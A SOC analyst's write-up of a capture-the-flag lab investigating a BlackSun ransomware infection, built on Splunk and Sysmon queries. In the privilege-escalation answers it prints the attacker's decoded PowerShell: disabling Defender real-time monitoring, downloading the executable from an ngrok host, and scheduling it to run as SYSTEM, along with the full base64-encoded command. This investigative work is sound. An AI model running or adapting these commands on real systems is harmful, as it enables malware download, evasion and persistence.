# EXERCISE : PS Eclipse

```
Scenario : You are a SOC Analyst for an MSSP (Managed Security Service Provider) company called TryNotHackMe .

A customer sent an email asking for an analyst to investigate the events that occurred on Keegan's machine on Monday, May 16th, 2022 .
The client noted that the machine is operational, but some files have a weird file extension. The client is worried that there was a ransomware attempt on Keegan's device. 

Your manager has tasked you to check the events in

to determine what occurred in Keegan's device. 

Happy Hunting!

```

## Questions:

## A suspicious binary was downloaded to the endpoint. What was the name of the binary?

> OUTSTANDING_GUTTER.exe

**Explaination:**

```
SPL:

index="*" EventCode="1"
| fields Image
| search [ search index="*" EventCode="3" | fields Image ]
| stats count by Image
```
Direct evidence of the downloaded file was not clearly available in the logs. Based on the scenario description mentioning ransomware behavior and unusual file extensions, I suspected that the malicious file had already been executed on the endpoint.

To investigate this, I focused on:

Sysmon EventCode 1 — Process Creation

Sysmon EventCode 3 — Network Connection

Ransomware commonly establishes network connections during execution, either for command-and-control communication, payload retrieval, or lateral movement. By correlating processes that both executed and generated network activity, I attempted to identify suspicious binaries.

The query revealed a process named:

`OUTSTANDING_GUTTER.exe`

The binary was executed from the Temp directory, which is commonly abused by malware for staging and execution. Due to the suspicious filename, execution behavior, and associated network activity, this binary was identified as the likely malicious file downloaded to the endpoint.

---

## What is the address the binary was downloaded from? Add http:// to your answer & defang the URL.

> hxxp[://]886e-181-215-214-32[.]ngrok[.]io

**Explanation:**

To find from where the malicious binary was downloaded, first I searched for the file creation event related to OUTSTANDING_GUTTER.exe.

```
index="*" EventCode="11" ComputerName="DESKTOP-TBV8NEF" "OUTSTANDING_GUTTER.exe"`

```

After I saw the results, I checked the earliest time event.Where i found 

`TargetFilename="C:\Windows\Temp\OUTSTANDING_GUTTER.exe"`

The process image associated with this event was:

`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`

From this, I understood that the executable was likely downloaded using a PowerShell command.

Next, I tried to collect all PowerShell command executions.

```
index="*" Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" CommandLine=*
| table _time ComputerName CommandLine
```
<img width="544" height="244" alt="image" src="https://github.com/user-attachments/assets/aa91e438-9b00-44fe-9b8f-413af3530a84" />
</br>

There were only a few PowerShell events, which made the investigation easier. While checking them manually, I noticed a suspicious PowerShell command using the -enc parameter, which means the command was Base64 encoded.

I decoded the encoded command using CyberChef.

<img width="544" height="244" alt="image" src="https://github.com/user-attachments/assets/2d6c07d0-b322-407c-b83b-00088dc7983c" />
</br>
After decoding, I found the original PowerShell command, which contained the URL used to download the malicious executable.Using the decoded command, I was able to identify the address from where the binary was downloaded.

---

## What Windows executable was used to download the suspicious binary? Enter full path.

> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

**Explaination:**

To identify which Windows executable was used to download the suspicious binary, I reviewed the events related to OUTSTANDING_GUTTER.exe.

From the previous investigation, I found a file creation event showing that the executable was created in the Temp directory.

The event also showed the associated process image responsible for the activity:

`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`

This indicates that PowerShell was used to download and create the suspicious executable on the system.

---

## What command was executed to configure the suspicious binary to run with elevated privileges?

> "C:\Windows\system32\schtasks.exe" /Create /TN OUTSTANDING_GUTTER.exe /TR C:\Windows\Temp\COUTSTANDING_GUTTER.exe /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU SYSTEM /f

**Explaination:**


Where we can see the command is from the decoded PowerShell command. After decoding the encoded PowerShell payload, I found the command used to configure the suspicious binary to run with elevated privileges.

The following command was present in the decoded payload:

`Set-MpPreference -DisableRealtimeMonitoring $true;`<br>
This command disables Microsoft Defender real-time protection to reduce the chance of the malware being detected during execution.

`wget http://886e-181-215-214-32.ngrok[.]io/OUTSTANDING_GUTTER.exe -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe;`. <br>
This command downloads the malicious executable from the remote server and stores it.

`SCHTASKS /Create /TN "OUTSTANDING_GUTTER.exe" /TR "C:\Windows\Temp\OUTSTANDING_GUTTER.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f;`<br>
This command creates a scheduled task named.
The task is also configured to: Run as SYSTEM (highest privilege!) , Force create, no questions asked

`SCHTASKS /Run /TN "OUTSTANDING_GUTTER.exe"`<br>
This command immediately runs the scheduled task, causing the malware to execute on the endpoint.

---

## What permissions will the suspicious binary run as? What was the command to run the binary with elevated privileges? (Format: User + ; + CommandLine)

 > NT AUTHORITY\SYSTEM;”C:\Windows\system32\schtasks.exe” /Run /TN OUTSTANDING_GUTTER.exe

**Explaination :**

To find the command executed with elevated privileges, I searched Sysmon EventCode=1 (Process Creation), filtering by ParentCommandLine containing the encoded PowerShell command.
```
index="*" EventCode=1 ParentCommandLine="powershell.exe  -exec bypass -enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA7AHcAZwBlAHQAIABoAHQAdABwADoALwAvADgAOAA2AGUALQAxADgAMQAtADIAMQA1AC0AMgAxADQALQAzADIALgBuAGcAcgBvAGsALgBpAG8ALwBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlADsAUwBDAEgAVABBAFMASwBTACAALwBDAHIAZQBhAHQAZQAgAC8AVABOACAAIgBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACIAIAAvAFQAUgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABDAE8AVQBUAFMAVABBAE4ARABJAE4ARwBfAEcAVQBUAFQARQBSAC4AZQB4AGUAIgAgAC8AUwBDACAATwBOAEUAVgBFAE4AVAAgAC8ARQBDACAAQQBwAHAAbABpAGMAYQB0AGkAbwBuACAALwBNAE8AIAAqAFsAUwB5AHMAdABlAG0ALwBFAHYAZQBuAHQASQBEAD0ANwA3ADcAXQAgAC8AUgBVACAAIgBTAFkAUwBUAEUATQAiACAALwBmADsAUwBDAEgAVABBAFMASwBTACAALwBSAHUAbgAgAC8AVABOACAAIgBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACIA" ComputerName="DESKTOP-TBV8NEF"
| table _time,CommandLine,ParentCommandLine
```

This revealed that PowerShell spawned schtasks.exe as a child process with the command:
`C:\Windows\system32\schtasks.exe" /Run /TN OUTSTANDING_GUTTER.exe` </br>
<img width="544" height="244" alt="image" src="https://github.com/user-attachments/assets/3ca30be1-bd71-4602-b02e-615c7f869dc6" /> </br>

The parent process being the encoded PowerShell confirms this was part of the malicious payload.

The binary ran as NT AUTHORITY\SYSTEM — confirmed by /RU SYSTEM in the /Create command.

---
## The suspicious binary connected to a remote server. What address did it connect to? Add http:// to your answer & defang the URL.
> hxxp[://]9030-181-215-214-32[.]ngrok[.]io

**Explanation:**


```
index="*"  Image="C:\\Windows\\Temp\\OUTSTANDING_GUTTER.exe" TaskCategory="Dns query (rule: DnsQuery)"
| table QueryName
```
To identify the remote server the binary connected to, I searched for DNS query events (TaskCategory="Dns query (rule: DnsQuery)") generated specifically by OUTSTANDING_GUTTER.exe. The QueryName field revealed the domain name the malicious binary attempted to resolve, confirming it connected to the C2 server.

---
## The malicious script was flagged as malicious. What do you think was the actual name of the malicious script?
> script.ps1

**Explanation:**

```
index="*"
| stats count by TargetFilename
| where like(TargetFilename, "C:\\Windows\\Temp\\%.ps1")
```

By searching for PowerShell scripts (.ps1) dropped in C:\Windows\Temp\ using TargetFilename, the query revealed that only one executable was present in that directory alongside the malicious binary.

---

## The malicious script was flagged as malicious. What do you think was the actual name of the malicious script?
> BlackSun.ps1

**Explanation:**


To identify the actual name of the malicious script, I searched for the file hash of script.ps1 using TargetFilename filtered to C:\Windows\Temp\script.ps1. The Hashes field returned the cryptographic hash value of the file.

I then took that hash value and submitted it to VirusTotal — a threat intelligence platform that checks files against multiple antivirus engines. VirusTotal matched the hash to a known malicious sample, which revealed the original name of the malicious script."

<img width="544" height="244" alt="image" src="https://github.com/user-attachments/assets/5fcced08-5f46-4005-8be1-2984ba2bb55d" />

---
## A ransomware note was saved to disk, which can serve as an IOC. What is the full path to which the ransom note was saved?
> C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt

**Explanation:**


Since ransomware typically drops a ransom note as a .txt file, I searched for any .txt files created on the system using a wildcard search on TargetFilename. This revealed a file named BlackSun_README.txt
```
index="*" "*.txt"
```

Since I already identified the malware as BlackSun Ransomware, I searched online and confirmed that BlackSun_README.txt is the default ransom note filename dropped by this ransomware family.
```
index="*" "BlackSun_README.txt"
```

---

## The script saved an image file to disk to replace the user's desktop wallpaper, which can also serve as an IOC. What is the full path of the image?
> C:\Users\Public\Pictures\blacksun.jpg

**Explanation:**

```
index="*" "blacksun.jpg"
```

Since I had already researched BlackSun Ransomware during the previous question, I knew that it drops a wallpaper image named blacksun.jpg to replace the victim's desktop background. I used this knowledge to search directly in Splunk for any reference to `blacksun.jpg`, which revealed the full path where the image was saved on disk.

